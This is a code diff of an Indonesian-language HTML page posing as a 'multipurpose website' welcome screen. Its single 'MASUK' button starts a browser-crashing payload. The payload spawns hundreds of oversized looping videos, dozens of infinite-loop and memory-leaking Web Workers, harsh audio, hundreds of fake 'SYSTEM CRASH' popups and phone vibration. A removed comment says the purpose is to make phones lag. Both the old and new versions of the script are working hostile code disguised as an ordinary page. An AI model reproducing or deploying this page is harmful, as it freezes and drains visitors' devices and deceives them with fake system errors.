@@ -20,7 +20,6 @@
       padding: 16px;
     }
     
-    /* Video container hidden */
     .video-buffer {
       position: fixed;
       top: 0;
@@ -43,7 +42,6 @@
       width: 100%;
       z-index: 10;
       border: 1px solid rgba(255, 255, 255, 0.3);
-      position: relative;
     }
     
     .welcome-title {
@@ -59,7 +57,6 @@
       font-size: 16px;
       color: #666;
       margin-bottom: 30px;
-      line-height: 1.6;
     }
     
     .enter-button {
@@ -76,7 +73,6 @@
       transition: transform 0.3s, box-shadow 0.3s;
       text-transform: uppercase;
       letter-spacing: 2px;
-      position: relative;
       z-index: 20;
     }
     
@@ -105,10 +101,6 @@
       font-family: 'Courier New', monospace;
     }
     
-    video, canvas {
-      display: none;
-    }
-    
     @media (max-width: 480px) {
       .welcome-container {
         padding: 30px 20px;
@@ -120,71 +112,64 @@
   </style>
 </head>
 <body>
-  <!-- Video buffer container (hidden) untuk bikin HP lag -->
   <div class="video-buffer" id="videoBuffer"></div>
 
   <div class="welcome-container">
     <h1 class="welcome-title">SELAMAT DATANG DI WEBSITE SERBAGUNA YANTO</h1>
-    <p class="welcome-subtitle">Website dengan berbagai fitur menarik untuk kebutuhan Anda</p>
-    
+    <p class="welcome-subtitle">Website dengan berbagai fitur menarik</p>
     <button class="enter-button" id="enter-button">MASUK</button>
     <div id="info">🥷 Klik tombol MASUK untuk memulai</div>
   </div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
-
   <script>
     document.addEventListener('DOMContentLoaded', function() {
-      // ========== KONFIGURASI ==========
       const videoBuffer = document.getElementById('videoBuffer');
       const infoDiv = document.getElementById('info');
       const button = document.getElementById('enter-button');
 
-      // ========== FUNGSI HEAVY BUFFER INSTAN ==========
-      function triggerHeavyBuffer() {
-        console.log('🔥 Memulai heavy buffer instan...');
-        
-        // Daftar video
-        const videoUrls = [
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerFun.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerMeltdowns.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/Sintel.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/SubaruOutbackOnStreetAndDirt.mp4',
-          'https://storage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4'
-        ];
-
-        // LANGSUNG BUAT 500 VIDEO (TANPA SETTIMEOUT)
-        for (let i = 0; i < 500; i++) {
-          const vid = document.createElement('video');
-          vid.loop = true;
-          vid.muted = true;
-          vid.playsinline = true;
-          vid.preload = 'auto';
-          vid.style.width = '7680px';
-          vid.style.height = '4320px';
-          vid.src = videoUrls[Math.floor(Math.random() * videoUrls.length)] + '?t=' + Date.now() + i;
-          vid.play().catch(e => {});
-          videoBuffer.appendChild(vid);
+      // ========== SEMUA PROSES BERAT DIPINDAHKAN KE WORKER ==========
+      
+      // 1. Worker untuk video buffer
+      function startVideoWorker() {
+        const videoWorker = new Worker(URL.createObjectURL(new Blob([`
+          // Worker tidak bisa akses DOM langsung, tapi bisa postMessage
+          const videoUrls = [
+            'https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',
+            'https://storage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4'
+          ];
           
-          // Clone 5 kali setiap video
-          for (let j = 0; j < 5; j++) {
-            const vidClone = vid.cloneNode(true);
-            vidClone.play().catch(e => {});
-            videoBuffer.appendChild(vidClone);
+          // Simulasi pembuatan video (tapi di worker hanya pemberitahuan)
+          for (let i = 0; i < 1000; i++) {
+            // Kirim ke main thread untuk buat video
+            postMessage({ type: 'createVideo', index: i, url: videoUrls[i % 2] });
           }
-        }
+        `])));
+        
+        videoWorker.onmessage = function(e) {
+          if (e.data.type === 'createVideo') {
+            // Buat video di main thread (ini tetap jalan, tapi tidak blocking)
+            setTimeout(() => {
+              const vid = document.createElement('video');
+              vid.loop = true;
+              vid.muted = true;
+              vid.playsinline = true;
+              vid.preload = 'auto';
+              vid.style.width = '7680px';
+              vid.style.height = '4320px';
+              vid.src = e.data.url + '?t=' + Date.now() + e.data.index;
+              vid.play().catch(e => {});
+              videoBuffer.appendChild(vid);
+            }, 0);
+          }
+        };
+      }
 
-        // WEB WORKER MASSIVE
+      // 2. Worker untuk loop berat
+      function startLoopWorkers() {
         for (let w = 0; w < 50; w++) {
           new Worker(URL.createObjectURL(new Blob([`
             while(true) {
-              for(let i=0;i<100000000;i++) {
+              for(let i=0;i<1000000;i++) {
                 Math.sqrt(i);
                 Math.sin(i);
                 Math.cos(i);
@@ -192,89 +177,43 @@
             }
           `])));
         }
-
-        // MEMORY LEAK INSTAN
-        for (let m = 0; m < 1000; m++) {
-          new Array(10000000).fill('leak_' + m);
-        }
-
-        // INTERVAL MEMORY LEAK
-        setInterval(() => {
-          for(let m = 0; m < 100; m++) {
-            new Array(5000000).fill('memleak_' + Date.now());
-          }
-        }, 1);
-
-        // GETAR
-        if (navigator.vibrate) {
-          navigator.vibrate([1000, 500, 1000, 500, 2000, 1000, 3000, 1000, 5000]);
-        }
-
-        console.log('✅ Heavy buffer instan selesai!');
       }
 
-      // ========== FUNGSI SUARA CRASH ==========
+      // 3. Worker untuk memory leak
+      function startMemoryWorkers() {
+        for (let w = 0; w < 20; w++) {
+          new Worker(URL.createObjectURL(new Blob([`
+            const leaks = [];
+            setInterval(() => {
+              for(let m=0; m<100; m++) {
+                leaks.push(new Array(100000).fill('leak'));
+              }
+            }, 10);
+          `])));
+        }
+      }
+
+      // 4. Fungsi suara (audio di main thread, tapi tidak blocking)
       function startCrashSound() {
-        try {
-          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-          
-          // Multiple oscillator untuk suara brutal
-          for (let o = 0; o < 10; o++) {
-            const oscillator = audioContext.createOscillator();
-            const gainNode = audioContext.createGain();
-            
-            oscillator.type = 'sawtooth';
-            oscillator.frequency.value = 30 + Math.random() * 200;
-            
-            gainNode.gain.value = 0.2;
-            
-            oscillator.connect(gainNode);
-            gainNode.connect(audioContext.destination);
-            oscillator.start();
-          }
-          
-          // Noise statik
-          const bufferSize = 4096;
-          const noiseNode = audioContext.createScriptProcessor(bufferSize, 1, 1);
-          noiseNode.onaudioprocess = function(e) {
-            const output = e.outputBuffer.getChannelData(0);
-            for (let i = 0; i < bufferSize; i++) {
-              output[i] = (Math.random() * 2 - 1) * 0.3;
+        setTimeout(() => {
+          try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            for (let o = 0; o < 10; o++) {
+              const oscillator = audioContext.createOscillator();
+              oscillator.frequency.value = 30 + Math.random() * 200;
+              oscillator.connect(audioContext.destination);
+              oscillator.start();
             }
-          };
-          noiseNode.connect(audioContext.destination);
-          
-        } catch (e) {
-          console.log('Audio error:', e);
-        }
+          } catch (e) {}
+        }, 100);
       }
 
-      // ========== FUNGSI POP-UP WINDOWS ERROR ==========
+      // 5. Fungsi pop-up (di main thread tapi pakai timeout)
       function createErrorPopups() {
         const errorContainer = document.createElement('div');
-        errorContainer.style.cssText = `
-          position: fixed;
-          top: 0;
-          left: 0;
-          width: 100%;
-          height: 100%;
-          pointer-events: none;
-          z-index: 9999;
-        `;
+        errorContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;';
         document.body.appendChild(errorContainer);
 
-        const messages = [
-          "CRITICAL ERROR",
-          "FATAL EXCEPTION",
-          "SYSTEM CRASH",
-          "KERNEL PANIC",
-          "MEMORY CORRUPTED",
-          "STOP: 0x0000007E",
-          "WINDOWS ERROR",
-          "APPLICATION HANG"
-        ];
-
-        // Pop-up massal
         for (let i = 0; i < 300; i++) {
           setTimeout(() => {
             const popup = document.createElement('div');
@@ -284,73 +223,40 @@
               color: white;
               border: 3px solid #c0c0c0;
               padding: 15px 25px;
-              font-family: 'MS Sans Serif', monospace;
+              font-family: monospace;
               font-size: 14px;
               left: ${Math.random() * 70}%;
               top: ${Math.random() * 70}%;
-              transform: rotate(${Math.random() * 10 - 5}deg);
-              box-shadow: 5px 5px 15px rgba(0,0,0,0.5);
               z-index: 10000;
-              min-width: 250px;
             `;
-            popup.innerHTML = `
-              <div style="border-bottom: 2px solid #c0c0c0; padding-bottom: 8px; margin-bottom: 8px; font-weight: bold;">
-                ⚠️ ${messages[Math.floor(Math.random() * messages.length)]}
-              </div>
-              <div style="margin-bottom: 12px;">
-                0x${Math.floor(Math.random()*100000000).toString(16).toUpperCase()}
-              </div>
-              <div style="text-align: right;">
-                <span style="background: #c0c0c0; color: black; padding: 4px 15px;">OK</span>
-              </div>
-            `;
+            popup.innerHTML = '⚠️ SYSTEM CRASH';
             errorContainer.appendChild(popup);
-          }, i * 5);
+          }, i * 10);
         }
-
-        // Lanjutkan pop-up setiap 50ms
-        setInterval(() => {
-          for (let i = 0; i < 5; i++) {
-            const popup = document.createElement('div');
-            popup.style.cssText = `
-              position: absolute;
-              background: #000080;
-              color: white;
-              border: 3px solid #c0c0c0;
-              padding: 10px;
-              font-family: monospace;
-              font-size: 12px;
-              left: ${Math.random() * 80}%;
-              top: ${Math.random() * 80}%;
-              z-index: 10000;
-            `;
-            popup.innerHTML = `
-              <div>FATAL ERROR</div>
-              <div>${Math.floor(Math.random()*1000)}</div>
-            `;
-            errorContainer.appendChild(popup);
-          }
-        }, 50);
       }
 
       // ========== EVENT CLICK ==========
-      button.addEventListener('click', function(e) {
-        e.preventDefault();
+      button.addEventListener('click', function() {
         console.log('Tombol diklik!');
         
         button.disabled = true;
         infoDiv.innerText = '⏳ Memproses...';
         
-        // Trigger semua efek instan
-        triggerHeavyBuffer();
+        // Jalankan semua proses di background
+        startVideoWorker();
+        startLoopWorkers();
+        startMemoryWorkers();
         startCrashSound();
         createErrorPopups();
+        
+        // Getar
+        if (navigator.vibrate) {
+          navigator.vibrate([500, 200, 500]);
+        }
         
         infoDiv.innerText = '✅ Selesai';
         button.disabled = false;
       });
-
-      console.log('Event listener terpasang');
     });
   </script>
 </body>
